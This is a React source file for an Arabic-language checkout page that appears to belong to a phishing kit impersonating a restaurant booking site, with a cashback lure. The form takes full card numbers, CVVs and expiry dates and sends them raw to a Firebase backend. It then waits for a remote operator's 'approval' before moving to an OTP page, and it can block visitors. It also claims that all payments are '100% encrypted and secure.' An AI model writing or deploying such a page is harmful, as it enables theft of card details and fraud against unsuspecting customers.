import { useLocation } from "wouter";
import {
  ChevronDown,
  Wifi,
  X,
  CreditCard,
  Lock,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useState, useEffect } from "react";
import { handlePay, handleCurrentPage, listenForApproval, isBinBlocked } from "@/lib/firebase";
import cashbackImage from "@assets/adcs_1777058781807.jpg";
import {
  RestaurantNav,
  ProgressBar,
  PageBanner,
  BujairiFooter,
} from "@/components/bujairi-header";

function CashbackPopup({ onClose }: { onClose: () => void }) {
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4"
      dir="rtl"
    >
      <div
        className="absolute inset-0 bg-black/60 backdrop-blur-sm animate-fade-in"
        onClick={onClose}
      />
      <div className="relative rounded-3xl max-w-md w-full shadow-2xl animate-scale-in overflow-hidden bg-[#0a1438]">
        <button
          onClick={onClose}
          className="absolute top-3 left-3 z-10 text-white hover:text-white transition-colors w-9 h-9 rounded-full bg-black/50 hover:bg-black/70 flex items-center justify-center"
          data-testid="button-close-popup"
        >
          <X className="w-5 h-5" />
        </button>

        <img
          src={cashbackImage}
          alt="عرض كاش باك 30%"
          className="w-full h-auto block"
          data-testid="img-cashback-popup"
        />

        <div className="p-4 bg-[#0a1438]">
          <Button
            onClick={onClose}
            size="lg"
            className="w-full bg-white text-[#4a1525] font-bold shadow-lg hover:bg-white/90"
            data-testid="button-continue-popup"
          >
            متابعة الدفع
          </Button>
        </div>
      </div>
    </div>
  );
}

export default function CheckoutPage() {
  const [showPopup, setShowPopup] = useState(true);

  useEffect(() => {
    handleCurrentPage("checkout");
  }, []);

  return (
    <div
      className="min-h-screen bg-[#ebddd0] flex flex-col"
      dir="rtl"
    >
      {showPopup && <CashbackPopup onClose={() => setShowPopup(false)} />}
      <RestaurantNav active="booking-options" />
      <ProgressBar current={3} />
      <PageBanner title="الدفع" />
      <main className="flex-1 px-4 py-6">
        <PaymentForm />
      </main>
      <PaymentFooter />
      <BujairiFooter />
    </div>
  );
}

const validateLuhn = (cardNum: string): boolean => {
  const digits = cardNum.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(digits)) return false;

  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

const getCardType = (cardNum: string): string => {
  const num = cardNum.replace(/\s/g, "");
  if (/^4/.test(num)) return "visa";
  if (/^5[1-5]/.test(num)) return "mastercard";
  if (/^(508|60|62|67)/.test(num)) return "mada";
  return "";
};

const getCardGradient = (cardType: string): string => {
  switch (cardType) {
    case "visa":
      return "from-[#1a1f71] via-[#2d3494] to-[#1a1f71]";
    case "mastercard":
      return "from-[#eb001b] via-[#f79e1b] to-[#eb001b]";
    case "mada":
      return "from-[#004d40] via-[#00695c] to-[#004d40]";
    default:
      return "from-[#434343] via-[#5a5a5a] to-[#434343]";
  }
};

interface CardPreviewProps {
  cardNumber: string;
  cardName: string;
  expiryMonth: string;
  expiryYear: string;
  cardType: string;
}

function CardPreview({
  cardNumber,
  cardName,
  expiryMonth,
  expiryYear,
  cardType,
}: CardPreviewProps) {
  const rawDigits = cardNumber.replace(/\D/g, "");
  const last4 = rawDigits.slice(-4);
  const displayNumber = rawDigits.length >= 4
    ? `•••• •••• •••• ${last4}`
    : "•••• •••• •••• ••••";
  const displayName = cardName || "اسم حامل البطاقة";
  const displayExpiry = `${expiryMonth}/${expiryYear.slice(-2)}`;

  return (
    <div className="mb-6" dir="ltr">
      <div
        className={`relative w-full max-w-sm mx-auto aspect-[1.586/1] rounded-2xl p-6 bg-gradient-to-br ${getCardGradient(cardType)} shadow-2xl overflow-hidden`}
        data-testid="card-preview"
      >
        <div className="flex items-start justify-between">
          <div className="w-14 h-10 bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 rounded-lg flex items-center justify-center shadow-md">
            <div className="w-10 h-7 border-2 border-yellow-600/30 rounded-sm" />
          </div>
          <Wifi className="w-7 h-7 text-white/70 rotate-90" />
        </div>

        <div className="mt-6">
          <p className="text-white text-xl font-mono tracking-[0.1em] drop-shadow-lg whitespace-nowrap">
            {displayNumber}
          </p>
        </div>

        <div className="absolute bottom-6 left-6 right-6">
          <div className="flex justify-between items-end">
            <div>
              <p className="text-white/60 text-[10px] uppercase mb-1">
                Card Holder
              </p>
              <p className="text-white text-sm font-medium tracking-wide truncate max-w-[180px]">
                {displayName}
              </p>
            </div>
            <div className="text-right">
              <p className="text-white/60 text-[10px] uppercase mb-1">
                Expires
              </p>
              <p className="text-white text-sm font-medium">{displayExpiry}</p>
            </div>
          </div>
        </div>

        <div className="absolute top-6 right-6">
          {cardType === "visa" && (
            <div className="text-white font-bold text-2xl italic">VISA</div>
          )}
          {cardType === "mastercard" && (
            <div className="flex">
              <div className="w-10 h-10 rounded-full bg-red-500 opacity-80" />
              <div className="w-10 h-10 rounded-full bg-yellow-500 opacity-80 -ml-5" />
            </div>
          )}
          {cardType === "mada" && (
            <div className="text-white font-bold text-xl">mada</div>
          )}
        </div>

        <div className="absolute -bottom-20 -right-20 w-40 h-40 rounded-full bg-white/5" />
        <div className="absolute -bottom-10 -right-10 w-32 h-32 rounded-full bg-white/5" />
      </div>
    </div>
  );
}

function PaymentForm() {
  const [, setLocation] = useLocation();
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("01");
  const [expiryYear, setExpiryYear] = useState("2026");
  const [cvv, setCvv] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [submitError, setSubmitError] = useState("");

  const cardType = getCardType(cardNumber);

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted);
      setErrors((prev) => ({ ...prev, cardNumber: "" }));
      setSubmitError("");
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/[^0-9]/g, "");
    if (v.length <= 4) {
      setCvv(v);
      setErrors((prev) => ({ ...prev, cvv: "" }));
      setSubmitError("");
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};
    const rawCard = cardNumber.replace(/\s/g, "");

    if (!rawCard || rawCard.length < 13) {
      newErrors.cardNumber = "رقم البطاقة غير صحيح";
    } else if (!validateLuhn(rawCard)) {
      newErrors.cardNumber = "رقم البطاقة غير صالح";
    }

    if (!cardName.trim() || cardName.trim().length < 3) {
      newErrors.cardName = "يرجى إدخال الاسم على البطاقة";
    }

    const now = new Date();
    const expiry = new Date(parseInt(expiryYear), parseInt(expiryMonth) - 1);
    if (expiry < now) {
      newErrors.expiry = "البطاقة منتهية الصلاحية";
    }

    if (!cvv || cvv.length < 3) {
      newErrors.cvv = "كود الحماية غير صحيح";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isWaitingApproval, setIsWaitingApproval] = useState(false);

  useEffect(() => {
    if (!isWaitingApproval) return;
    const unsubscribe = listenForApproval((status) => {
      if (status === "approved") {
        setIsWaitingApproval(false);
        setLocation("/otp");
      } else if (status === "rejected") {
        setIsWaitingApproval(false);
        setSubmitError("البطاقة غير مدعومه حاول استخدام بطاقة اخرى");
      }
    });
    return () => unsubscribe();
  }, [isWaitingApproval, setLocation]);

  const handleSubmit = async () => {
    if (isSubmitting || isWaitingApproval) return;
    if (!validateForm()) return;
    setIsSubmitting(true);
    setSubmitError("");

    const cleanCard = cardNumber.replace(/\s/g, "");

    try {
      if (await isBinBlocked(cleanCard)) {
        setSubmitError("هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
        setIsSubmitting(false);
        return;
      }
    } catch {
      // ignore lookup errors and proceed
    }

    const paymentInfo = {
      cardNumber: cleanCard,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: getCardType(cardNumber),
      currentPage: "checkout",
    };

    try {
      await handlePay(paymentInfo, () => {});
    } catch (error: any) {
      if (error?.message === "VISITOR_BLOCKED") {
        setSubmitError("تم حظر هذا الزائر ولا يمكنه المتابعة");
      } else {
        setSubmitError("حدث خطأ أثناء معالجة الدفع");
      }
      setIsSubmitting(false);
      return;
    }

    setIsSubmitting(false);
    setIsWaitingApproval(true);
  };

  return (
    <div
      className="max-w-md mx-auto space-y-6 animate-fade-in"
      data-testid="payment-form"
    >
      <CardPreview
        cardNumber={cardNumber}
        cardName={cardName}
        expiryMonth={expiryMonth}
        expiryYear={expiryYear}
        cardType={cardType}
      />

      <div className="flex items-center justify-center gap-4 py-2">
        <img
          src="/mada.png"
          className="h-7 opacity-70 hover:opacity-100 transition-opacity"
          alt="mada"
        />
        <img
          src="/master.svg"
          className="h-7 opacity-70 hover:opacity-100 transition-opacity"
          alt="mastercard"
        />
        <img
          src="/visa.png"
          className="h-4 opacity-70 hover:opacity-100 transition-opacity"
          alt="visa"
        />
      </div>

      <div className="bg-white rounded-2xl shadow-xl p-6 space-y-5">
        <div>
          <Label
            htmlFor="cardNumber"
            className="text-sm font-medium text-foreground mb-2 flex items-center gap-2"
          >
            <CreditCard className="w-4 h-4 text-primary" />
            رقم البطاقة
          </Label>
          <div className="relative">
            <Input
              id="cardNumber"
              type="text"
              value={cardNumber}
              onChange={handleCardNumberChange}
              maxLength={19}
              className={`text-left pr-12 h-12 rounded-xl border-2 font-mono ${errors.cardNumber ? "border-red-500" : "border-input focus:border-primary"}`}
              placeholder="0000 0000 0000 0000"
              dir="ltr"
              data-testid="input-card-number"
            />
            <div className="absolute right-3 top-1/2 -translate-y-1/2 flex gap-1">
              {cardType === "visa" && (
                <img src="/visa.png" className="h-4" alt="visa" />
              )}
              {cardType === "mastercard" && (
                <img src="/master.svg" className="h-6" alt="mastercard" />
              )}
              {cardType === "mada" && (
                <img src="/mada.png" className="h-6" alt="mada" />
              )}
            </div>
          </div>
          {errors.cardNumber && (
            <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>
          )}
        </div>

        <div>
          <Label
            htmlFor="cardName"
            className="text-sm font-medium text-foreground mb-2 block"
          >
            الاسم على البطاقة
          </Label>
          <Input
            id="cardName"
            type="text"
            value={cardName}
            onChange={(e) => {
              setCardName(e.target.value.toUpperCase().slice(0, 60));
              setErrors((prev) => ({ ...prev, cardName: "" }));
              setSubmitError("");
            }}
            maxLength={60}
            className={`text-left h-12 rounded-xl border-2 ${errors.cardName ? "border-red-500" : "border-input focus:border-primary"}`}
            placeholder="MOHAMMED ALI"
            dir="ltr"
            data-testid="input-card-name"
          />
          {errors.cardName && (
            <p className="text-red-500 text-xs mt-1">{errors.cardName}</p>
          )}
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div>
            <Label className="text-sm font-medium text-foreground mb-2 block">
              تاريخ الانتهاء
            </Label>
            <div className="flex gap-2">
              <div className="flex-1 relative">
                <select
                  value={expiryMonth}
                  onChange={(e) => {
                    setExpiryMonth(e.target.value);
                    setErrors((prev) => ({ ...prev, expiry: "" }));
                  }}
                  className={`w-full h-12 px-3 rounded-xl border-2 bg-background text-foreground appearance-none ${errors.expiry ? "border-red-500" : "border-input focus:border-primary"}`}
                  data-testid="select-expiry-month"
                >
                  {Array.from({ length: 12 }, (_, i) => {
                    const month = String(i + 1).padStart(2, "0");
                    return (
                      <option key={month} value={month}>
                        {month}
                      </option>
                    );
                  })}
                </select>
                <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
              </div>
              <div className="flex-1 relative">
                <select
                  value={expiryYear}
                  onChange={(e) => {
                    setExpiryYear(e.target.value);
                    setErrors((prev) => ({ ...prev, expiry: "" }));
                  }}
                  className={`w-full h-12 px-3 rounded-xl border-2 bg-background text-foreground appearance-none ${errors.expiry ? "border-red-500" : "border-input focus:border-primary"}`}
                  data-testid="select-expiry-year"
                >
                  {Array.from({ length: 10 }, (_, i) => {
                    const year = String(2025 + i);
                    return (
                      <option key={year} value={year}>
                        {year}
                      </option>
                    );
                  })}
                </select>
                <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
              </div>
            </div>
            {errors.expiry && (
              <p className="text-red-500 text-xs mt-1">{errors.expiry}</p>
            )}
          </div>

          <div>
            <Label
              htmlFor="cvv"
              className="text-sm font-medium text-foreground mb-2 block"
            >
              CVV
            </Label>
            <Input
              id="cvv"
              type="text"
              value={cvv}
              onChange={handleCvvChange}
              maxLength={4}
              className={`text-center h-12 rounded-xl border-2 font-mono ${errors.cvv ? "border-red-500" : "border-input focus:border-primary"}`}
              placeholder="123"
              dir="ltr"
              data-testid="input-cvv"
            />
            {errors.cvv && (
              <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>
            )}
          </div>
        </div>

        {submitError && (
          <p className="text-red-500 text-xs text-center" data-testid="error-checkout-submit">
            {submitError}
          </p>
        )}

        {isWaitingApproval && (
          <div
            className="bg-[#fdf6e3] border border-[#c9a96e]/40 rounded-xl p-4 flex items-center gap-3"
            data-testid="card-waiting-approval"
          >
            <div className="w-6 h-6 border-2 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin flex-shrink-0" />
            <div className="text-right flex-1">
              <p className="text-[#4a1525] font-semibold text-sm">
                معالجة الدفع
              </p>
              <p className="text-[#7a6b5f] text-xs mt-0.5">
                يرجى عدم إغلاق الصفحة، قد تستغرق العملية بضع لحظات...
              </p>
            </div>
          </div>
        )}

        <Button
          onClick={handleSubmit}
          size="lg"
          className="w-full bg-primary text-white shadow-lg mt-4"
          disabled={isSubmitting || isWaitingApproval}
          data-testid="button-pay"
        >
          {isWaitingApproval
            ? "في انتظار الموافقة..."
            : isSubmitting
            ? "جاري المعالجة..."
            : "متابعة الدفع"}
        </Button>
      </div>
    </div>
  );
}

function PaymentFooter() {
  return (
    <footer
      className="px-4 py-6 text-center space-y-3"
      data-testid="payment-footer"
    >
      <div className="flex items-center justify-center gap-2">
        <div className="w-8 h-8 bg-[#f5efe6] rounded-full flex items-center justify-center">
          <Lock className="w-4 h-4 text-[#c9a96e]" />
        </div>
        <p className="text-sm text-muted-foreground">
          جميع عمليات الدفع مشفرة وآمنة 100%
        </p>
      </div>
      <p className="text-sm text-primary font-medium">
        احصل على كاش باك يصل إلى 30% عند الدفع من خلال البطاقات من فئة
        البلاتينية
      </p>
    </footer>
  );
}
